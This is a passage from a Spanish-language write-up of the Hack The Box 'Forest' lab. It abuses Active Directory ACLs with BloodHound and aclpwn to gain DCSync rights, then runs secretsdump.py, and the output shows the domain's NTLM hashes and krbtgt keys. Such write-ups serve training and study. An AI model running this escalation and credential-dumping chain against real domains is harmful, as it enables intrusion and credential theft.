&lt;h3 id=&#34;bloodhound&#34;&gt;Bloodhound&lt;/h3&gt;
&lt;p&gt;Importamos los datos que obtuvimos a bloodhound. Nos mostrará un mapa con todos los usuarios disponibles y los grupos de usuarios a los que pertenecen, con los distintos permisos que cada uno tiene, incluso, los permisos que tienen uno sobre otro.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/forest/Screenshot%20from%202019-11-29%2021.16.10.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Nos ubicamos en el usuario actual (svc-alfresco) y vemos informacion del usuario, lo que nos interesa es &lt;code&gt;Recehable High Values&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/forest/Screenshot%20from%202019-11-29%2021.20.58.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Podemos ver que el usuario es miembro de varios grupos, y tiene permisos de &lt;strong&gt;WriteDACL&lt;/strong&gt;, que le permiten al usuario modificar permisos de dominio en este caso &lt;strong&gt;htb.local&lt;/strong&gt; y realizar operaciones en &lt;strong&gt;DCSync&lt;/strong&gt;.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/forest/Screenshot%20from%202019-11-29%2021.29.36.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Bloodhound nos proporciona cierta informacion que puede ser de utilidad para realizar estas operaciones, para ello nos ubicamos en &lt;code&gt;Writedacl &amp;gt; Help &amp;gt; Abuse Info&lt;/code&gt;.&lt;/p&gt;
&lt;h3 id=&#34;aclpwn&#34;&gt;ACLPWN&lt;/h3&gt;
&lt;p&gt;Podemos hacerlo de forma automatizada utilizando esta herramienta, aclpwn permite encontrar y explotar una ruta para obtener privilegios administrativos utilizando los datos obtenidos de bloodhound desde la base de datos.&lt;/p&gt;
&lt;p&gt;Realizamos una busqueda del camino mas cercano:&lt;/p&gt;
&lt;p&gt;Los parametros:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;8
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;-f usuario/computadora &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Es el nodo de inicio&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
-ft user &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Especificamos que el nodo inicial es usuario/computadora/dominio/grupo&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
-t htb.local &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;El destino al cual deseamos llegar&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
-tt domain &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Especificamos que el destino es usuario/computadora/dominio/grupo&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
-d htb.local &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;El Dominio&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
-du neo4j &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Usuario para la base de datos&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
-dp toor &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Contraseña para la base de datos&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
-dry &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Especificamos que no deseamos atacar&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Podemos ver que encontro un camino y puede ser explotado.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;root@kali:~/tools/aclpwn.py# aclpwn -f svc-alfresco -ft user -t htb.local -tt domain -d htb.local -dry -du neo4j -dp toor
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Path found!
Path &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;0&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;: &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;SVC-ALFRESCO@HTB.LOCAL&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;MemberOf&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;-&amp;gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;SERVICE ACCOUNTS@HTB.LOCAL&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;MemberOf&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;-&amp;gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;PRIVILEGED IT ACCOUNTS@HTB.LOCAL&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;MemberOf&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;-&amp;gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;ACCOUNT OPERATORS@HTB.LOCAL&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;GenericAll&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;-&amp;gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;EXCHANGE TRUSTED SUBSYSTEM@HTB.LOCAL&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;MemberOf&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;-&amp;gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;EXCHANGE WINDOWS PERMISSIONS@HTB.LOCAL&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;WriteDacl&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;-&amp;gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;HTB.LOCAL&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;!&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Unsupported operation: GetChanges on HTB.LOCAL &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Domain&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Invalid path, skipping
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Path found!
Path &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;1&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;: &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;SVC-ALFRESCO@HTB.LOCAL&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;MemberOf&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;-&amp;gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;SERVICE ACCOUNTS@HTB.LOCAL&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;MemberOf&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;-&amp;gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;PRIVILEGED IT ACCOUNTS@HTB.LOCAL&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;MemberOf&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;-&amp;gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;ACCOUNT OPERATORS@HTB.LOCAL&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;GenericAll&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;-&amp;gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;EXCHANGE WINDOWS PERMISSIONS@HTB.LOCAL&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;WriteDacl&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;-&amp;gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;HTB.LOCAL&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
Please choose a path &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;0-1&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Path validated, the following modifications are required &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; exploitation in the current configuration:
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Adding user SVC-ALFRESCO to group EXCHANGE WINDOWS PERMISSIONS@HTB.LOCAL
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Modifying domain DACL to give DCSync rights to SVC-ALFRESCO
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/forest/Screenshot%20from%202019-11-29%2022.23.11.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;root@kali:~/tools/impacket/examples# aclpwn -f svc-alfresco -ft user -t htb.local -tt domain -d htb.local -du neo4j -dp toor -s 10.10.10.161
Please supply the password or LM:NTLM hashes of the account you are escalating from: 
[+] Path found!
Path [0]: (SVC-ALFRESCO@HTB.LOCAL)-[MemberOf]-&amp;gt;(SERVICE ACCOUNTS@HTB.LOCAL)-[MemberOf]-&amp;gt;(PRIVILEGED IT ACCOUNTS@HTB.LOCAL)-[MemberOf]-&amp;gt;(ACCOUNT OPERATORS@HTB.LOCAL)-[GenericAll]-&amp;gt;(EXCHANGE TRUSTED SUBSYSTEM@HTB.LOCAL)-[MemberOf]-&amp;gt;(EXCHANGE WINDOWS PERMISSIONS@HTB.LOCAL)-[WriteDacl]-&amp;gt;(HTB.LOCAL)
[!] Unsupported operation: GetChanges on HTB.LOCAL (Domain)
[-] Invalid path, skipping
[+] Path found!
Path [1]: (SVC-ALFRESCO@HTB.LOCAL)-[MemberOf]-&amp;gt;(SERVICE ACCOUNTS@HTB.LOCAL)-[MemberOf]-&amp;gt;(PRIVILEGED IT ACCOUNTS@HTB.LOCAL)-[MemberOf]-&amp;gt;(ACCOUNT OPERATORS@HTB.LOCAL)-[GenericAll]-&amp;gt;(EXCHANGE WINDOWS PERMISSIONS@HTB.LOCAL)-[WriteDacl]-&amp;gt;(HTB.LOCAL)
Please choose a path [0-1] 1
[-] Memberof -&amp;gt; continue
[-] Memberof -&amp;gt; continue
[-] Memberof -&amp;gt; continue
[-] Adding user SVC-ALFRESCO to group EXCHANGE WINDOWS PERMISSIONS@HTB.LOCAL
[+] Added CN=svc-alfresco,OU=Service Accounts,DC=htb,DC=local as member to CN=Exchange Windows Permissions,OU=Microsoft Exchange Security Groups,DC=htb,DC=local
[-] Re-binding to LDAP to refresh group memberships of SVC-ALFRESCO@HTB.LOCAL
[+] Re-bind successful
[-] Modifying domain DACL to give DCSync rights to SVC-ALFRESCO
[+] Dacl modification successful
[+] Finished running tasks
[+] Saved restore state to aclpwn-20191130-014547.restore
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/forest/Screenshot%20from%202019-11-30%2000.46.34.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Ahora que que tenemos permisos DCSync podemos utilizar secretsdump.py para obtener los hash de los usuarios.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;  1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;  2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;  3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;  4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;  5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;  6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;  7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;  8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;  9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 21
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 22
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 23
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 24
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 25
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 26
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 27
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 28
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 29
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 30
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 31
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 32
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 33
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 34
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 35
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 36
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 37
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 38
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 39
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 40
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 41
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 42
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 43
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 44
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 45
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 46
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 47
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 48
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 49
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 50
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 51
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 52
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 53
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 54
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 55
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 56
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 57
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 58
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 59
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 60
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 61
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 62
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 63
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 64
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 65
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 66
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 67
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 68
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 69
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 70
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 71
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 72
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 73
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 74
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 75
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 76
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 77
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 78
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 79
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 80
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 81
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 82
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 83
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 84
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 85
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 86
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 87
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 88
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 89
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 90
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 91
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 92
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 93
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 94
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 95
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 96
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 97
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 98
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 99
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;100
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;101
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;root@kali:~/tools/impacket# secretsdump.py htb.local/svc-alfresco:s3rvice@10.10.10.161
Impacket v0.9.21-dev - Copyright &lt;span class=&#34;m&#34;&gt;2019&lt;/span&gt; SecureAuth Corporation

&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Dumping Domain Credentials &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;domain&lt;span class=&#34;se&#34;&gt;\u&lt;/span&gt;id:rid:lmhash:nthash&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Using the DRSUAPI method to get NTDS.DIT secrets
htb.local&lt;span class=&#34;se&#34;&gt;\A&lt;/span&gt;dministrator:500:aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:819af826bb148e603acb0f33d17632f8:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb.local&lt;span class=&#34;se&#34;&gt;\$&lt;/span&gt;331000-VK4ADACQNUCA:1123:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb.local&lt;span class=&#34;se&#34;&gt;\S&lt;/span&gt;M_2c8eef0a09b545acb:1124:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb.local&lt;span class=&#34;se&#34;&gt;\S&lt;/span&gt;M_ca8c2ed5bdab4dc9b:1125:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb.local&lt;span class=&#34;se&#34;&gt;\S&lt;/span&gt;M_75a538d3025e4db9a:1126:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb.local&lt;span class=&#34;se&#34;&gt;\S&lt;/span&gt;M_681f53d4942840e18:1127:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb.local&lt;span class=&#34;se&#34;&gt;\S&lt;/span&gt;M_1b41c9286325456bb:1128:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb.local&lt;span class=&#34;se&#34;&gt;\S&lt;/span&gt;M_9b69f1b9d2cc45549:1129:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb.local&lt;span class=&#34;se&#34;&gt;\S&lt;/span&gt;M_7c96b981967141ebb:1130:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb.local&lt;span class=&#34;se&#34;&gt;\S&lt;/span&gt;M_c75ee099d0a64c91b:1131:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb.local&lt;span class=&#34;se&#34;&gt;\S&lt;/span&gt;M_1ffab36a2f5f479cb:1132:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb.local&lt;span class=&#34;se&#34;&gt;\H&lt;/span&gt;ealthMailboxc3d7722:1134:aad3b435b51404eeaad3b435b51404ee:4761b9904a3d88c9c9341ed081b4ec6f:::
htb.local&lt;span class=&#34;se&#34;&gt;\H&lt;/span&gt;ealthMailboxfc9daad:1135:aad3b435b51404eeaad3b435b51404ee:5e89fd2c745d7de396a0152f0e130f44:::
htb.local&lt;span class=&#34;se&#34;&gt;\H&lt;/span&gt;ealthMailboxc0a90c9:1136:aad3b435b51404eeaad3b435b51404ee:3b4ca7bcda9485fa39616888b9d43f05:::
htb.local&lt;span class=&#34;se&#34;&gt;\H&lt;/span&gt;ealthMailbox670628e:1137:aad3b435b51404eeaad3b435b51404ee:e364467872c4b4d1aad555a9e62bc88a:::
htb.local&lt;span class=&#34;se&#34;&gt;\H&lt;/span&gt;ealthMailbox968e74d:1138:aad3b435b51404eeaad3b435b51404ee:ca4f125b226a0adb0a4b1b39b7cd63a9:::
htb.local&lt;span class=&#34;se&#34;&gt;\H&lt;/span&gt;ealthMailbox6ded678:1139:aad3b435b51404eeaad3b435b51404ee:c5b934f77c3424195ed0adfaae47f555:::
htb.local&lt;span class=&#34;se&#34;&gt;\H&lt;/span&gt;ealthMailbox83d6781:1140:aad3b435b51404eeaad3b435b51404ee:9e8b2242038d28f141cc47ef932ccdf5:::
htb.local&lt;span class=&#34;se&#34;&gt;\H&lt;/span&gt;ealthMailboxfd87238:1141:aad3b435b51404eeaad3b435b51404ee:f2fa616eae0d0546fc43b768f7c9eeff:::
htb.local&lt;span class=&#34;se&#34;&gt;\H&lt;/span&gt;ealthMailboxb01ac64:1142:aad3b435b51404eeaad3b435b51404ee:0d17cfde47abc8cc3c58dc2154657203:::
htb.local&lt;span class=&#34;se&#34;&gt;\H&lt;/span&gt;ealthMailbox7108a4e:1143:aad3b435b51404eeaad3b435b51404ee:d7baeec71c5108ff181eb9ba9b60c355:::
htb.local&lt;span class=&#34;se&#34;&gt;\H&lt;/span&gt;ealthMailbox0659cc1:1144:aad3b435b51404eeaad3b435b51404ee:900a4884e1ed00dd6e36872859c03536:::
htb.local&lt;span class=&#34;se&#34;&gt;\s&lt;/span&gt;ebastien:1145:aad3b435b51404eeaad3b435b51404ee:96246d980e3a8ceacbf9069173fa06fc:::
htb.local&lt;span class=&#34;se&#34;&gt;\l&lt;/span&gt;ucinda:1146:aad3b435b51404eeaad3b435b51404ee:4c2af4b2cd8a15b1ebd0ef6c58b879c3:::
htb.local&lt;span class=&#34;se&#34;&gt;\s&lt;/span&gt;vc-alfresco:1147:aad3b435b51404eeaad3b435b51404ee:9248997e4ef68ca2bb47ae4e6f128668:::
htb.local&lt;span class=&#34;se&#34;&gt;\a&lt;/span&gt;ndy:1150:aad3b435b51404eeaad3b435b51404ee:29dfccaf39618ff101de5165b19d524b:::
htb.local&lt;span class=&#34;se&#34;&gt;\m&lt;/span&gt;ark:1151:aad3b435b51404eeaad3b435b51404ee:9e63ebcb217bf3c6b27056fdcb6150f7:::
htb.local&lt;span class=&#34;se&#34;&gt;\s&lt;/span&gt;anti:1152:aad3b435b51404eeaad3b435b51404ee:483d4c70248510d8e0acb6066cd89072:::
FOREST$:1000:aad3b435b51404eeaad3b435b51404ee:179967e72ed1faea7d8de2f3c2b5d003:::
EXCH01$:1103:aad3b435b51404eeaad3b435b51404ee:050105bb043f5b8ffc3a9fa99b5ef7c1:::
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Kerberos keys grabbed
krbtgt:aes256-cts-hmac-sha1-96:9bf3b92c73e03eb58f698484c38039ab818ed76b4b3a0e1863d27a631f89528b
krbtgt:aes128-cts-hmac-sha1-96:13a5c6b1d30320624570f65b5f755f58
krbtgt:des-cbc-md5:9dd5647a31518ca8
htb.local&lt;span class=&#34;se&#34;&gt;\H&lt;/span&gt;ealthMailboxc3d7722:aes256-cts-hmac-sha1-96:258c91eed3f684ee002bcad834950f475b5a3f61b7aa8651c9d79911e16cdbd4
htb.local&lt;span class=&#34;se&#34;&gt;\H&lt;/span&gt;ealthMailboxc3d7722:aes128-cts-hmac-sha1-96:47138a74b2f01f1886617cc53185864e
